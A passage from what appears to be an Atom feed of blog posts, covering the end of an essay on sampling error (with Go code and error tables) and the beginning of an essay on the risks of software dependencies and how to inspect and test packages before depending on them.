1000;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;is a very effective way to get a data set you can analyze by hand&#xA;and still derive many useful conclusions from.&#xA;&lt;a class=anchor href=&#34;#accuracy&#34;&gt;&lt;h2 id=&#34;accuracy&#34;&gt;Accuracy&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Let’s work out what accuracy we should expect from these estimates.&#xA;The brute force approach would be to run many samples of a given size&#xA;and calculate the accuracy for each.&#xA;&lt;a href=&#34;https://go.dev/play/p/NWUOanCpFtl&#34;&gt;This program&lt;/a&gt; runs 1,000 trials of 100 samples each,&#xA;calculating the observed error for each estimate&#xA;and then printing them all in sorted order.&#xA;If we plot those points one after the other along the x axis,&#xA;we get a picture like this:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample1&#34; class=&#34;center pad&#34; width=370 height=369 src=&#34;sample1.png&#34; srcset=&#34;sample1.png 1x, sample1@2x.png 2x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;a href=&#34;https://9fans.github.io/plan9port/man/man1/gview.html&#34;&gt;data viewer I’m using in this screenshot&lt;/a&gt; has scaled the x-axis labels by&#xA;a factor of 1,000 (“x in thousands”).&#xA;Eyeballing the scatterplot, we can see that half the time the error&#xA;is under 3%, and 80% of the time the error is under 5½%.&#xA;&#xA;&lt;p&gt;&#xA;We might wonder at this point whether the error&#xA;depends on the actual answer (24.3% in our programs so far).&#xA;It does: the error will be lower when the population is lopsided.&#xA;Obviously, if the M&amp;amp;Ms are 0% or 100% Peter faces,&#xA;our estimates will have no error at all.&#xA;In a slightly less degenerate case,&#xA;if the M&amp;amp;Ms are 1% or 99% Peter faces, the most likely estimate&#xA;from just a few samples is 0% or 100%, which has only 1% error.&#xA;It turns out that, in general, the error is maximized when&#xA;the actual fraction is 50%,&#xA;so &lt;a href=&#34;https://go.dev/play/p/Vm2s1SwlKKT&#34;&gt;we’ll use that&lt;/a&gt; for the rest of the analysis.&#xA;&#xA;&lt;p&gt;&#xA;With an actual fraction of 50%, 1,000 sorted errors&#xA;from estimating by sampling 100 values look like:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample2&#34; class=&#34;center pad&#34; width=369 height=369 src=&#34;sample2.png&#34; srcset=&#34;sample2.png 1x, sample2@2x.png 2x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;The errors are a bit larger.&#xA;Now the half the time the error is 4% and 80% of the time the error is 6%.&#xA;Zooming in on the tail end of the plot produces:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample3&#34; class=&#34;center pad&#34; width=390 height=368 src=&#34;sample3.png&#34; srcset=&#34;sample3.png 1x, sample3@2x.png 2x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;We can see that 90% of the trials have error 8% or less,&#xA;95% of the trials have error 10% or less,&#xA;and 99% of the trials have error 12% or less.&#xA;The statistical way to phrase those statements&#xA;is that “a sample of size N = 100&#xA;produces a margin of error of 8% with 90% confidence,&#xA;10% with 95% confidence,&#xA;and 12% with 99% confidence.”&#xA;&#xA;&lt;p&gt;&#xA;Instead of eyeballing the graphs, we can &lt;a href=&#34;https://go.dev/play/p/Xq7WMyrNWxq&#34;&gt;update the program&lt;/a&gt;&#xA;to compute these numbers directly.&#xA;&lt;pre&gt;$ go run sample.go&#xA;N =    10: 90%: 30.00% 95%: 30.00% 99%: 40.00%&#xA;N =   100: 90%:  9.00% 95%: 11.00% 99%: 13.00%&#xA;N =  1000: 90%:  2.70% 95%:  3.20% 99%:  4.30%&#xA;N = 10000: 90%:  0.82% 95%:  0.98% 99%:  1.24%&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;There is something meta about using sampling (of trials) to estimate the errors introduced&#xA;by sampling of an actual distribution.&#xA;What about the error being introduced by sampling the errors?&#xA;We could instead write a program to count all possible outcomes&#xA;and calculate the exact error distribution,&#xA;but counting won’t work for larger sample sizes.&#xA;Luckily, others have done the math for us&#xA;and even implemented the relevant functions&#xA;in Go’s standard &lt;a href=&#34;https://pkg.go.dev/math&#34;&gt;math package&lt;/a&gt;.&#xA;The margin of error for a given confidence level&#xA;and sample size is:&#xA;&lt;pre&gt;func moe(confidence float64, N int) float64 {&#xA;    return math.Erfinv(confidence) / math.Sqrt(2 * float64(N))&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That lets us compute the table &lt;a href=&#34;https://go.dev/play/p/DKeNfDwLmJZ&#34;&gt;more directly&lt;/a&gt;.&#xA;&lt;pre&gt;$ go run sample.go&#xA;N =     10: 90%: 26.01% 95%: 30.99% 99%: 40.73%&#xA;N =     20: 90%: 18.39% 95%: 21.91% 99%: 28.80%&#xA;N =     50: 90%: 11.63% 95%: 13.86% 99%: 18.21%&#xA;N =    100: 90%:  8.22% 95%:  9.80% 99%: 12.88%&#xA;N =    200: 90%:  5.82% 95%:  6.93% 99%:  9.11%&#xA;N =    500: 90%:  3.68% 95%:  4.38% 99%:  5.76%&#xA;N =   1000: 90%:  2.60% 95%:  3.10% 99%:  4.07%&#xA;N =   2000: 90%:  1.84% 95%:  2.19% 99%:  2.88%&#xA;N =   5000: 90%:  1.16% 95%:  1.39% 99%:  1.82%&#xA;N =  10000: 90%:  0.82% 95%:  0.98% 99%:  1.29%&#xA;N =  20000: 90%:  0.58% 95%:  0.69% 99%:  0.91%&#xA;N =  50000: 90%:  0.37% 95%:  0.44% 99%:  0.58%&#xA;N = 100000: 90%:  0.26% 95%:  0.31% 99%:  0.41%&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We can also reverse the equation to compute the necessary&#xA;sample size from a given confidence level and margin of error:&#xA;&lt;pre&gt;func N(confidence, moe float64) int {&#xA;    return int(math.Ceil(0.5 * math.Pow(math.Erfinv(confidence)/moe, 2)))&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That lets us &lt;a href=&#34;https://go.dev/play/p/Y81_FORHvw5&#34;&gt;compute this table&lt;/a&gt;.&#xA;&lt;pre&gt;$ go run sample.go&#xA;moe = 5%:  90%:   271  95%:   385  99%:   664&#xA;moe = 2%:  90%:  1691  95%:  2401  99%:  4147&#xA;moe = 1%:  90%:  6764  95%:  9604  99%: 16588&#xA;$&#xA;&lt;/pre&gt;&#xA;&lt;a class=anchor href=&#34;#limitations&#34;&gt;&lt;h2 id=&#34;limitations&#34;&gt;Limitations&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;To accurately estimate the fraction of items with&#xA;a given property, like M&amp;amp;Ms with Peter faces,&#xA;each item must have the same chance of being selected,&#xA;as each M&amp;amp;M did.&#xA;Suppose instead that we had ten bags of M&amp;amp;Ms:&#xA;nine one-pound bags with 500 M&amp;amp;Ms each,&#xA;and a small bag containing the 37 M&amp;amp;Ms we used before.&#xA;If we want to estimate the fraction of M&amp;amp;Ms with&#xA;Peter faces, it would not work to sample by&#xA;first picking a bag at random&#xA;and then picking an M&amp;amp;M at random from the bag.&#xA;The chance of picking any specific M&amp;amp;M from a one-pound bag&#xA;would be 1/10 × 1/500 = 1/5,000, while the chance&#xA;of picking any specific M&amp;amp;M from the small bag would be&#xA;1/10 × 1/37 = 1/370.&#xA;We would end up with an estimate of around 9/370 = 2.4% Peter faces,&#xA;even though the actual answer is 9/(9×500+37) = 0.2% Peter faces.&#xA;&#xA;&lt;p&gt;&#xA;The problem here is not the kind of random sampling error&#xA;that we computed in the previous section.&#xA;Instead it is a systematic error caused by a sampling mechanism&#xA;that does not align with the statistic being estimated.&#xA;We could recover an accurate estimate by weighting&#xA;an M&amp;amp;M found in the small bag as only w = 37/500 of an M&amp;amp;M&#xA;in both the numerator and denominator of any estimate.&#xA;For example, if we picked 100 M&amp;amp;Ms with replacement from each bag&#xA;and found 24 Peter faces in the small bag,&#xA;then instead of 24/1000 = 2.4% we would compute 24w/(900+100w) = 0.2%.&#xA;&#xA;&lt;p&gt;&#xA;As a less contrived example,&#xA;&lt;a href=&#34;https://go.dev/blog/pprof&#34;&gt;Go’s memory profiler&lt;/a&gt;&#xA;aims to sample approximately one allocation per half-megabyte allocated&#xA;and then derive statistics about where programs allocate memory.&#xA;Roughly speaking, to do this the profiler maintains a sampling trigger,&#xA;initialized to a random number between 0 and one million.&#xA;Each time a new object is allocated,&#xA;the profiler decrements the trigger by the size of the object.&#xA;When an allocation decrements the trigger below zero,&#xA;the profiler samples that allocation&#xA;and then resets the trigger to a new random number&#xA;between 0 and one million.&#xA;&#xA;&lt;p&gt;&#xA;This byte-based sampling means that to estimate the&#xA;fraction of bytes allocated in a given function,&#xA;the profiler can divide the total sampled bytes allocated in that function&#xA;divided by the total sampled bytes allocated in the entire program.&#xA;Using the same approach to&#xA;estimate the fraction of &lt;i&gt;objects&lt;/i&gt; allocated in a given function&#xA;would be inaccurate: it would overcount large objects and undercount&#xA;small ones, because large objects are more likely to be sampled.&#xA;In order to recover accurate statistics about allocation counts,&#xA;the profiler applies a size-based weighting function&#xA;during the calcuation, just as in the M&amp;amp;M example.&#xA;(This is the reverse of the situation with the M&amp;amp;Ms:&#xA;we are randomly sampling individual bytes of allocated memory&#xA;but now want statistics about their “bags”.)&#xA;&#xA;&lt;p&gt;&#xA;It is not always possible to undo skewed sampling,&#xA;and the skew makes margin of error calculation&#xA;more difficult too.&#xA;It is almost always better to make sure that the&#xA;sampling is aligned with the statistic you want to compute.&#xA;</content>
  </entry>
  <entry>
    <title>Our Software Dependency Problem</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/deps</id>
    <link rel="alternate" href="http://research.swtch.com/deps"></link>
    <published>2019-01-23T11:00:00-05:00</published>
    <updated>2019-01-23T11:02:00-05:00</updated>
    <summary type="text">Download and run code from strangers on the internet. What could go wrong?</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;For decades, discussion of software reuse was far more common than actual software reuse.&#xA;Today, the situation is reversed: developers reuse software written by others every day,&#xA;in the form of software dependencies,&#xA;and the situation goes mostly unexamined.&#xA;&#xA;&lt;p&gt;&#xA;My own background includes a decade of working with&#xA;Google’s internal source code system,&#xA;which treats software dependencies as a first-class concept,&lt;a class=footnote id=body1 href=&#34;#note1&#34;&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/a&gt;&#xA;and also developing support for&#xA;dependencies in the Go programming language.&lt;a class=footnote id=body2 href=&#34;#note2&#34;&gt;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;Software dependencies carry with them&#xA;serious risks that are too often overlooked.&#xA;The shift to easy, fine-grained software reuse has happened so quickly&#xA;that we do not yet understand the best practices for choosing&#xA;and using dependencies effectively,&#xA;or even for deciding when they are appropriate and when not.&#xA;My purpose in writing this article is to raise awareness of the risks&#xA;and encourage more investigation of solutions.&#xA;&lt;a class=anchor href=&#34;#what_is_a_dependency&#34;&gt;&lt;h2 id=&#34;what_is_a_dependency&#34;&gt;What is a dependency?&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;In today’s software development world,&#xA;a &lt;i&gt;dependency&lt;/i&gt; is additional code that you want to call from your program.&#xA;Adding a dependency avoids repeating work already done:&#xA;designing, writing, testing, debugging, and maintaining a specific&#xA;unit of code.&#xA;In this article we’ll call that unit of code a &lt;i&gt;package&lt;/i&gt;;&#xA;some systems use terms like library or module instead of package.&#xA;&#xA;&lt;p&gt;&#xA;Taking on externally-written dependencies is an old practice:&#xA;most programmers have at one point in their careers&#xA;had to go through the steps of manually downloading and installing&#xA;a required library, like C’s PCRE or zlib, or C++’s Boost or Qt,&#xA;or Java’s JodaTime or JUnit.&#xA;These packages contain high-quality, debugged code&#xA;that required significant expertise to develop.&#xA;For a program that needs the functionality provided by one of these packages,&#xA;the tedious work of manually downloading, installing, and updating&#xA;the package&#xA;is easier than the work of redeveloping that functionality from scratch.&#xA;But the high fixed costs of reuse&#xA;mean that manually-reused packages tend to be big:&#xA;a tiny package would be easier to reimplement.&#xA;&#xA;&lt;p&gt;&#xA;A &lt;i&gt;dependency manager&lt;/i&gt;&#xA;(sometimes called a package manager)&#xA;automates the downloading and installation of dependency packages.&#xA;As dependency managers&#xA;make individual packages easier to download and install,&#xA;the lower fixed costs make&#xA;smaller packages economical to publish and reuse.&#xA;&#xA;&lt;p&gt;&#xA;For example, the Node.js dependency manager NPM provides&#xA;access to over 750,000 packages.&#xA;One of them, &lt;code&gt;escape-string-regexp&lt;/code&gt;,&#xA;provides a single function that escapes regular expression&#xA;operators in its input.&#xA;The entire implementation is:&#xA;&lt;pre&gt;var matchOperatorsRe = /[|\\{}()[\]^$+*?.]/g;&#xA;&#xA;module.exports = function (str) {&#xA;    if (typeof str !== &#39;string&#39;) {&#xA;        throw new TypeError(&#39;Expected a string&#39;);&#xA;    }&#xA;    return str.replace(matchOperatorsRe, &#39;\\$&amp;amp;&#39;);&#xA;};&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Before dependency managers, publishing an eight-line code library&#xA;would have been unthinkable: too much overhead for too little benefit.&#xA;But NPM has driven the overhead approximately to zero,&#xA;with the result that nearly-trivial functionality&#xA;can be packaged and reused.&#xA;In late January 2019, the &lt;code&gt;escape-string-regexp&lt;/code&gt; package&#xA;is explicitly depended upon by almost a thousand&#xA;other NPM packages,&#xA;not to mention all the packages developers write for their own use&#xA;and don’t share.&#xA;&#xA;&lt;p&gt;&#xA;Dependency managers now exist for essentially every programming language.&#xA;Maven Central (Java),&#xA;Nuget (.NET),&#xA;Packagist (PHP),&#xA;PyPI (Python),&#xA;and RubyGems (Ruby)&#xA;each host over 100,000 packages.&#xA;The arrival of this kind of fine-grained, widespread software reuse&#xA;is one of the most consequential shifts in software development&#xA;over the past two decades.&#xA;And if we’re not more careful, it will lead to serious problems.&#xA;&lt;a class=anchor href=&#34;#what_could_go_wrong&#34;&gt;&lt;h2 id=&#34;what_could_go_wrong&#34;&gt;What could go wrong?&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A package, for this discussion, is code you download from the internet.&#xA;Adding a package as a dependency outsources the work of developing that&#xA;code—designing, writing, testing, debugging, and maintaining—to&#xA;someone else on the internet,&#xA;someone you often don’t know.&#xA;By using that code, you are exposing your own program&#xA;to all the failures and flaws in the dependency.&#xA;Your program’s execution now literally &lt;i&gt;depends&lt;/i&gt;&#xA;on code downloaded from this stranger on the internet.&#xA;Presented this way, it sounds incredibly unsafe.&#xA;Why would anyone do this?&#xA;&#xA;&lt;p&gt;&#xA;We do this because it’s easy,&#xA;because it seems to work,&#xA;because everyone else is doing it too,&#xA;and, most importantly, because&#xA;it seems like a natural continuation of&#xA;age-old established practice.&#xA;But there are important differences we’re ignoring.&#xA;&#xA;&lt;p&gt;&#xA;Decades ago, most developers already&#xA;trusted others to write software they depended on,&#xA;such as operating systems and compilers.&#xA;That software was bought from known sources,&#xA;often with some kind of support agreement.&#xA;There was still a potential for bugs or outright mischief,&lt;a class=footnote id=body3 href=&#34;#note3&#34;&gt;&lt;sup&gt;3&lt;/sup&gt;&lt;/a&gt;&#xA;but at least we knew who we were dealing with and usually&#xA;had commercial or legal recourses available.&#xA;&#xA;&lt;p&gt;&#xA;The phenomenon of open-source software,&#xA;distributed at no cost over the internet,&#xA;has displaced many of those earlier software purchases.&#xA;When reuse was difficult, there were fewer projects publishing reusable code packages.&#xA;Even though their licenses typically disclaimed, among other things,&#xA;any “implied warranties of merchantability and fitness for&#xA;a particular purpose,”&#xA;the projects built up well-known reputations&#xA;that often factored heavily into people’s decisions about which to use.&#xA;The commercial and legal support for trusting our software sources&#xA;was replaced by reputational support.&#xA;Many common early packages still enjoy good reputations:&#xA;consider BLAS (published 1979), Netlib (1987), libjpeg (1991),&#xA;LAPACK (1992), HP STL (1994), and zlib (1995).&#xA;&#xA;&lt;p&gt;&#xA;Dependency managers have scaled this open-source code reuse model down:&#xA;now, developers can share code at the granularity of&#xA;individual functions of tens of lines.&#xA;This is a major technical accomplishment.&#xA;There are myriad available packages,&#xA;and writing code can involve such a large number of them,&#xA;but the commercial, legal, and reputational support mechanisms&#xA;for trusting the code have not carried over.&#xA;We are trusting more code with less justification for doing so.&#xA;&#xA;&lt;p&gt;&#xA;The cost of adopting a bad dependency can be viewed&#xA;as the sum, over all possible bad outcomes,&#xA;of the cost of each bad outcome&#xA;multiplied by its probability of happening (risk).&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;deps-cost&#34; class=&#34;center pad&#34; width=383 height=95 src=&#34;deps-cost.png&#34; srcset=&#34;deps-cost.png 1x, deps-cost@1.5x.png 1.5x, deps-cost@2x.png 2x, deps-cost@3x.png 3x, deps-cost@4x.png 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;The context where a dependency will be used&#xA;determines the cost of a bad outcome.&#xA;At one end of the spectrum is a personal hobby project,&#xA;where the cost of most bad outcomes&#xA;is near zero:&#xA;you’re just having fun, bugs have no real impact other than&#xA;wasting some time, and even debugging them can be fun.&#xA;So the risk probability almost doesn’t matter: it’s being multiplied by zero.&#xA;At the other end of the spectrum is production software&#xA;that must be maintained for years.&#xA;Here, the cost of a bug in&#xA;a dependency can be very high:&#xA;servers may go down,&#xA;sensitive data may be divulged,&#xA;customers may be harmed,&#xA;companies may fail.&#xA;High failure costs make it much more important&#xA;to estimate and then reduce any risk of a serious failure.&#xA;&#xA;&lt;p&gt;&#xA;No matter what the expected cost,&#xA;experiences with larger dependencies&#xA;suggest some approaches for&#xA;estimating and reducing the risks of adding a software dependency.&#xA;It is likely that better tooling is needed to help reduce&#xA;the costs of these approaches,&#xA;much as dependency managers have focused to date on&#xA;reducing the costs of download and installation.&#xA;&lt;a class=anchor href=&#34;#inspect_the_dependency&#34;&gt;&lt;h2 id=&#34;inspect_the_dependency&#34;&gt;Inspect the dependency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;You would not hire a software developer you’ve never heard of&#xA;and know nothing about.&#xA;You would learn more about them first:&#xA;check references, conduct a job interview,&#xA;run background checks, and so on.&#xA;Before you depend on a package you found on the internet,&#xA;it is similarly prudent&#xA;to learn a bit about it first.&#xA;&#xA;&lt;p&gt;&#xA;A basic inspection can give you a sense&#xA;of how likely you are to run into problems trying to use this code.&#xA;If the inspection reveals likely minor problems,&#xA;you can take steps to prepare for or maybe avoid them.&#xA;If the inspection reveals major problems,&#xA;it may be best not to use the package:&#xA;maybe you’ll find a more suitable one,&#xA;or maybe you need to develop one yourself.&#xA;Remember that open-source packages are published&#xA;by their authors in the hope that they will be useful&#xA;but with no guarantee of usability or support.&#xA;In the middle of a production outage, you’ll be the one debugging it.&#xA;As the original GNU General Public License warned,&#xA;“The entire risk as to the quality and performance of the&#xA;program is with you.&#xA;Should the program prove defective, you assume the cost of all&#xA;necessary servicing, repair or correction.”&lt;a class=footnote id=body4 href=&#34;#note4&#34;&gt;&lt;sup&gt;4&lt;/sup&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;The rest of this section outlines some considerations when inspecting a package&#xA;and deciding whether to depend on it.&#xA;&lt;a class=anchor href=&#34;#design&#34;&gt;&lt;h3 id=&#34;design&#34;&gt;Design&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Is package’s documentation clear? Does the API have a clear design?&#xA;If the authors can explain the package’s API and its design well to you, the user,&#xA;in the documentation,&#xA;that increases the likelihood they have explained the implementation well to the computer, in the source code.&#xA;Writing code for a clear, well-designed API is also easier, faster, and hopefully less error-prone.&#xA;Have the authors documented what they expect from client code&#xA;in order to make future upgrades compatible?&#xA;(Examples include the C++&lt;a class=footnote id=body5 href=&#34;#note5&#34;&gt;&lt;sup&gt;5&lt;/sup&gt;&lt;/a&gt; and Go&lt;a class=footnote id=body6 href=&#34;#note6&#34;&gt;&lt;sup&gt;6&lt;/sup&gt;&lt;/a&gt; compatibility documents.)&#xA;&lt;a class=anchor href=&#34;#code_quality&#34;&gt;&lt;h3 id=&#34;code_quality&#34;&gt;Code Quality&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Is the code well-written?&#xA;Read some of it.&#xA;Does it look like the authors have been careful, conscientious, and consistent?&#xA;Does it look like code you’d want to debug? You may need to.&#xA;&#xA;&lt;p&gt;&#xA;Develop your own systematic ways to check code quality.&#xA;For example, something as simple as compiling a C or C++ program with&#xA;important compiler warnings enabled (for example, &lt;code&gt;-Wall&lt;/code&gt;)&#xA;can give you a sense of how seriously the developers work to avoid&#xA;various undefined behaviors.&#xA;Recent languages like Go, Rust, and Swift use an &lt;code&gt;unsafe&lt;/code&gt; keyword to mark&#xA;code that violates the type system; look to see how much unsafe code there is.&#xA;More advanced semantic tools like Infer&lt;a class=footnote id=body7 href=&#34;#note7&#34;&gt;&lt;sup&gt;7&lt;/sup&gt;&lt;/a&gt; or SpotBugs&lt;a class=footnote id=body8 href=&#34;#note8&#34;&gt;&lt;sup&gt;8&lt;/sup&gt;&lt;/a&gt; are helpful too.&#xA;Linters are less helpful: you should ignore rote suggestions&#xA;about topics like brace style and focus instead on semantic problems.&#xA;&#xA;&lt;p&gt;&#xA;Keep an open mind to development practices you may not be familiar with.&#xA;For example, the SQLite library ships as a single 200,000-line C source file&#xA;and a single 11,000-line header, the “amalgamation.”&#xA;The sheer size of these files should raise an initial red flag,&#xA;but closer investigation would turn up the&#xA;actual development source code, a traditional file tree with&#xA;over a hundred C source files, tests, and support scripts.&#xA;It turns out that the single-file distribution is built automatically from the original sources&#xA;and is easier for end users, especially those without dependency managers.&#xA;(The compiled code also runs faster, because the compiler can see more optimization opportunities.)&#xA;&lt;a class=anchor href=&#34;#testing&#34;&gt;&lt;h3 id=&#34;testing&#34;&gt;Testing&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Does the code have tests?&#xA;Can you run them?&#xA;Do they pass?&#xA;Tests establish that the code’s basic functionality is correct,&#xA;and they signal that the developer is serious about keeping it correct.&#xA;For example, the SQLite development tree has an incredibly thorough test suite&#xA;with over 30,000 individual test cases&#xA;as well as developer documentation explaining the testing strategy.&lt;a class=footnote id=body9 href=&#34;#note9&#34;&gt;&lt;sup&gt;9&lt;/sup&gt;&lt;/a&gt;&#xA;On the other hand,&#xA;if there are few tests or no tests, or if the tests fail, that’s a serious red flag:&#xA;future changes to the package&#xA;are likely to introduce regressions that could easily have been caught.&#xA;If you insist on tests in code you write yourself (you do, right?),&#xA;you should insist on tests in code you outsource to others.&#xA;&#xA;&lt;p&gt;&#xA;Assuming the tests exist, run, and pass, you can gather more&#xA;information by running them with run-time instrumentation&#xA;like code coverage analysis, race detection,&lt;a class=footnote id=body10 href=&#34;#note10&#34;&gt;&lt;sup&gt;10&lt;/sup&gt;&lt;/a&gt;&#xA;memory allocation checking,&#xA;and memory leak detection.&#xA;&lt;a class=anchor href=&#34;#debugging&#34;&gt;&lt;h3 id=&#34;debugging&#34;&gt;Debugging&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Find the package’s issue tracker.&#xA;Are there many open bug reports? How long have they been open?&#xA;Are there many fixed bugs? Have any bugs been fixed recently?&#xA;If you see lots of open issues about what look like real bugs,&#xA;especially if they have been open for a long time,&#xA;that’s not a good sign.&#xA;On the other hand, if the closed issues show that bugs are&#xA;rarely found and promptly fixed,&#xA;that’s great.&#xA;&lt;a class=anchor href=&#34;#maintenance&#34;&gt;&lt;h3 id=&#34;maintenance&#34;&gt;Maintenance&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Look at the package’s commit history.&#xA;How long has the code been actively maintained?&#xA;Is it actively maintained now?&#xA;Packages that have been actively maintained for an extended&#xA;amount of time are more likely to continue to be maintained.&#xA;How many people work on the package?&#xA;Many packages are personal projects that developers&#xA;create and share for fun in their spare time.&#xA;Others are the result of thousands of hours of work&#xA;by a group of paid developers.&#xA;In general, the latter kind of package is more likely to have&#xA;prompt bug fixes, steady improvements, and general upkeep.&#xA;&#xA;&lt;p&gt;&#xA;On the other hand, some code really is “done.”&#xA;For example, NPM’s &lt;code&gt;escape-string-regexp&lt;/code&gt;,&#xA;shown earlier, may never need to be modified again.&#xA;&lt;a class=anchor href=&#34;#usage&#34;&gt;&lt;h3 id=&#34;usage&#34;&gt;Usage&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Do many other packages depend on this code?&#xA;Dependency managers can often provide statistics about usage,&#xA;or you can use a web search to estimate how often&#xA;others write about using the package.&#xA;More users should at least mean more people for whom&#xA;the code works well enough,&#xA;along with faster detection of new bugs.&#xA;Widespread usage is also a hedge against the question of continued maintenance:&#xA;if a widely-used package loses its maintainer,&#xA;an interested user is likely to step forward.&#xA;&#xA;&lt;p&gt;&#xA;For example, libraries like PCRE or Boost or JUnit&#xA;are incredibly widely used.&#xA;That makes it more likely—although certainly not guaranteed—that&#xA;bugs you might otherwise run into have already been fixed,&#xA;because others ran into them first.&#xA;&lt;a class=anchor href=&#34;#security&#34;&gt;&lt;h3 id=&#34;security&#34;&gt;Security&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Will you be processing untrusted inputs with the package?&#xA;If so, does it seem to be robust against malicious inputs?&#xA;Does it have a history of security problems&#xA;listed in the National Vulnerability Database (NVD)?&lt;a class=footnote id=body11 href=&#34;#note11&#34;&gt;&lt;sup&gt;11&lt;/sup&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;For example, when Jeff Dean and I started work on&#xA;Google Code Search&lt;a class=footnote id=body12 href=&#34;#note12&#34;&gt;&lt;sup&gt;12&lt;/sup&gt;&lt;/a&gt;—&lt;code&gt;grep&lt;/code&gt; over public source code—in 2006,&#xA;the popular PCRE regular expression library seemed like an obvious choice.&#xA;In an early discussion with Google’s security team, however,&#xA;we learned that PCRE had a history of problems like buffer overflows,&#xA;especially in its parser.&#xA;We could have learned the same by searching for PCRE in the NVD.&#xA;That discovery didn’t immediately cause us to abandon PCRE,&#xA;but it did make us think more carefully about testing and isolation.&#xA;&lt;a class=anchor href=&#34;#licensing&#34;&gt;&lt;h3 id=&#34;licensing&#34;&gt;Licensing&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Is the code properly licensed?&#xA;Does it have a license at all?&#xA;Is the license acceptable for your project or company?&#xA;A surprising fraction of projects on GitHub have no clear license.&#xA;Your project or company may impose further restrictions on the&#xA;allowed licenses of dependencies.&#xA;For example, Google disallows the use of code licensed under&#xA;AGPL-like licenses (too onerous) as well as WTFPL-like licenses (too vague).&lt;a class=footnote id=body13 href=&#34;#note13&#34;&gt;&lt;sup&gt;13&lt;/sup&gt;&lt;/a&gt;&#xA;&lt;a class=anchor href=&#34;#dependencies&#34;&gt;&lt;h3 id=&#34;dependencies&#34;&gt;Dependencies&lt;/h3&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Does the code have dependencies of its own?&#xA;Flaws in indirect dependencies are just as bad for your program&#xA;as flaws in direct dependencies.&#xA;Dependency managers can list all the transitive dependencies&#xA;of a given package, and each of them should ideally be inspected as&#xA;described in this section.&#xA;A package with many dependencies incurs additional inspection work,&#xA;because those same dependencies incur additional risk&#xA;that needs to be evaluated.&#xA;&#xA;&lt;p&gt;&#xA;Many developers have never looked at the full list of transitive&#xA;dependencies of their code and don’t know what they depend on.&#xA;For example, in March 2016 the NPM user community discovered&#xA;that many popular projects—including Babel, Ember, and React—all depended&#xA;indirectly on a tiny package called &lt;code&gt;left-pad&lt;/code&gt;,&#xA;consisting of a single 8-line function body.&#xA;They discovered this when&#xA;the author of &lt;code&gt;left-pad&lt;/code&gt; deleted that package from NPM,&#xA;inadvertently breaking most Node.js users’ builds.&lt;a class=footnote id=body14 href=&#34;#note14&#34;&gt;&lt;sup&gt;14&lt;/sup&gt;&lt;/a&gt;&#xA;And &lt;code&gt;left-pad&lt;/code&gt; is hardly exceptional in this regard.&#xA;For example, 30% of the&#xA;750,000 packages published on NPM&#xA;depend—at least indirectly—on &lt;code&gt;escape-string-regexp&lt;/code&gt;.&#xA;Adapting Leslie Lamport’s observation about distributed systems,&#xA;a dependency manager can easily&#xA;create a situation in which the failure of a package you didn’t&#xA;even know existed can render your own code unusable.&#xA;&lt;a class=anchor href=&#34;#test_the_dependency&#34;&gt;&lt;h2 id=&#34;test_the_dependency&#34;&gt;Test the dependency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The inspection process should include running a package’s own tests.&#xA;If the package passes the inspection and you decide to make your&#xA;project depend on it,&#xA;the next step should be to write new tests focused on the functionality&#xA;needed by your application.&#xA;These tests often start out as short standalone programs&#xA;written to make sure you can understand the package’s API&#xA;and that it does what you think it does.&#xA;(If you can’t or it doesn’t, turn back now!)&#xA;It is worth then taking the extra effort to turn those programs&#xA;into automated tests that can be run against newer versions of the package.&#xA;If you find a bug and have a potential fix,&#xA;you’ll want to be able to rerun these project-specific tests&#xA;easily, to make sure that the fix did not break anything else.&#xA;&#xA;&lt;p&gt;&#xA;It is especially worth exercising the likely problem areas&#xA;identified by the&#xA;basic inspection.&#xA;For Code Search, we knew from past experience&#xA;that PCRE sometimes took&#xA;a long time to execute certain regular expression searches.&#xA;Our initial plan was to have separate 